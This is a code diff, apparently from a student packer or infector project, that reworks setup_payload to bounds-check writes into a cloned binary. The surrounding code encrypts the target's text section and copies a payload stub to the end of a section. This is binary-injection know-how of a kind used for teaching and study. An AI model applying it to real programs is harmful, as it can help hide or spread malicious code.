@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/05/11 00:10:33 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/05/12 01:22:46 by agrumbac         ###   ########.fr       */
+/*   Updated: 2019/05/12 07:24:48 by agrumbac         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -82,7 +82,7 @@ static bool	init_constants(struct payload_constants *constants, \
 	return true;
 }
 
-bool		setup_payload(void *clone, const struct entry *original_entry)
+bool		setup_payload(const struct entry *original_entry)
 {
 	struct payload_constants	constants;
 
@@ -91,9 +91,15 @@ bool		setup_payload(void *clone, const struct entry *original_entry)
 
 	const size_t	payload_size = end_payload - begin_payload;
 	const size_t	text_size    = constants.relative_text_address;
-	void	*payload_location    = clone + original_entry->section_end_offset;
-	void	*constants_location  = payload_location + CALL_INSTR_SIZE;
-	void	*text_location       = payload_location - constants.relative_text_address;
+	const size_t	payload_off  = original_entry->section_end_offset;
+	const size_t	text_off     = payload_off - constants.relative_text_address;
+
+	void	*payload_location    = clone_safe(payload_off, payload_size);
+	void	*constants_location  = clone_safe(payload_off + CALL_INSTR_SIZE, sizeof(constants));
+	void	*text_location       = clone_safe(text_off, text_size);
+
+	if (!payload_location || !constants_location || !text_location)
+		return (errors(ERR_CORRUPT, "wildly unreasonable"));
 
 	encrypt(32, text_location, constants.key, text_size);
 	memcpy(payload_location, begin_payload, payload_size);
